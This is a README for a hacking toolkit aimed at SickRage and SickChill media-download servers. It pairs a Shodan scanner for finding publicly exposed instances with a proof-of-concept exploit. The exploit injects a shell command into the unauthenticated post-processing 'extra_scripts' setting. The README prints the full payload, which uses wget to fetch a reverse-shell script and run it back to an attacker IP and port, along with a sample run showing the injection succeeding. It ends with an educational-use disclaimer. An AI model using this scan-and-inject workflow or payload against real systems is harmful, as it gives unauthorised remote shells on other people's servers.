# SickSploit

Collection of tools/scripts to exploit Sick* instances (SickRage, SickChill and similar forks.)

## Introduction 

SickRage/Chill/Beard are tools to automate the download of TV-Series using torrent or Usenet.
The programs offer similar functionalities and are all exploitable using the same technique.
In this repositories there are several tools, 'sickown' is a script which uses Shodan API to track down possible vulnerable instances of Sick* which are publicly exposed on the Internet.
Sickspolit is a POC tool that exploits a vulnerable instance.

## SickOwn 

Sickown uses a simple search query in Shodan to find open instances of Sick* and then attempts to also remove false positives from this list by querying the targets found.
At the time of the writing, 1834 targets are found.

Example usage of SickOwn is:

    $ python sickown.py -h
    usage: sickown.py [-h] API
    Use Shodan.io to track down vulnerable instances of SickChill/Rage
    positional arguments:
    API         The API_KEY for Shodan
    optional arguments:
    -h, --help  show this help message and exit

## SickSpolit

Sicksploit is a tool to provide a POC exploit for an open instance of Sickrage.
The exploit is easy and relies on a vulnerable feature. This vulnerabilities has been reported on 15th December to the maintainer of SickChill (the fork on which all the tests have been performed).
The exploit consisting in injecting a shell command in the 'extra_scripts' which are executed after post-processing downloaded files.
Post-processing usually consists of renaming and moving downloaded episodes of TV-Series, and Sick* offers the possibility to execute a custom script after each post-process.

The way I use to exploit this feature is by injecting a Payload such as:

    /usr/bin/wget https://raw.githubusercontent.com/Sudneo/sicksploit/master/shell.py -O /tmp/shell|/usr/bin/python /tmp/shell 192.168.1.200 4444

This will clearly download a simple reverse shell which I have also included in the repo and then execute it with IP:port to connect to as parameters.

Example usage:

    $ python sicksploit.py -h
    usage: sicksploit.py [-h] URL RHOST RPORT

    Exploit open instances of Sick*

    positional arguments:
    URL         The URL of the sick* instance to exploit - host:port
    RHOST       The IP where the exploited instance should connect to.
    RPORT       The port where the exploited instance should connect to.

    optional arguments:
    -h, --help  show this help message and exit

---

    python sicksploit.py http://192.168.1.105:8081 192.168.1.200 4444
    [+] Trying to get current values for some config items not to break post-processing.
    [+] Parsing current Post Processing configuration.
    [+] Successfully Parsed current configuration:
        naming_anime_multi_ep: 1
        naming_abd_pattern: %SN - %A.D - %EN
        delete_non_associated_files: on
        naming_sports_pattern: %SN - %A-D - %EN
        process_automatically: on
        mediabrowser_data: 0|0|0|0|0|0|0|0|0|0
        process_method: copy
        sony_ps3_data: 0|0|0|0|0|0|0|0|0|0
        tivo_data: 0|0|0|0|0|0|0|0|0|0
        alt_unrar_tool: unrar
        mede8er_data: 0|0|0|0|0|0|0|0|0|0
        file_timestamp_timezone: network
        naming_anime: None
        tv_download_dir: /home/daniele/process
        naming_anime_pattern: Season %0S/%SN - S%0SE%0E - %EN
        kodi_data: 0|0|0|0|0|0|0|0|0|0
        autopostprocessor_frequency: 10
        use_icacls: on
        rename_episodes: on
        unrar_tool: unrar
        unpack: 0
        naming_pattern: Season %0S/%SN - S%0SE%0E - %EN
        sync_files: !sync,lftp-pget-status,bts,!qb,!qB
        naming_multi_ep: 1
        postpone_if_sync_files: on
        allowed_extensions: nfo,srr,sfv,srt
        nfo_rename: on
        unpack_dir: 
        kodi_12plus_data: 0|0|0|0|0|0|0|0|0|0
        wdtv_data: 0|0|0|0|0|0|0|0|0|0
    [+] Starting to exploit http://192.168.1.105:8081.
    [+] Injecting payload: /usr/bin/wget https://raw.githubusercontent.com/Sudneo/sicksploit/master/shell.py -O /tmp/shell|/usr/bin/python /tmp/shell 192.168.1.200 4444
    [+] Exploit succeeded.
    [+] Trigger a manual post-processing of /home/daniele/process to execute the injected payload.
    [+] Manual post processing correctly scheduled. It might take a few minutes to actually get executed.

## Tested on

The exploit works on several versions of SickRage and SickChill where no authentication is configured. The same exploit technique would work on any SickBeard version as well.
However, I performed my tests on my own instance of SickChill Version: v2018.11.30-1 and SickRage Version: v2018.09.17-1. 


## Disclaimer

No public instances have been exploited in the process, nor I advise to do so. I have made this for pure educational purposes and I decline every responsibility for an eventual misuse of (part of) this code.

